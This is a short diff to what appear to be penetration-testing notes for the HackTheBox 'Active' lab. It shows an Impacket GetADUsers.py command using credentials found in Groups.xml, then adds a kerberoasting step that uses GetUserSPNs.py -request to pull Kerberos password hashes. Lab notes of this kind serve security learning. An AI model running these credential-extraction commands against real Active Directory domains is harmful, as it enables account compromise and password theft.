@@ -417,3 +417,8 @@ python GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/SVC_TGS
 ```
 
 In this case the user `active.htb/SVC_TGS` was obtained from the Groups.xml file.
+
+If Bloodhound indicates a user is kerberoastable, then run the following to retrieve the kerberos password hash:
+```
+GetUserSPNs.py  -request -dc-ip {{if of the domain controller}} {{user as which is being run with domain (password needed) e.g. active.htb/svc_tgs}}
+```
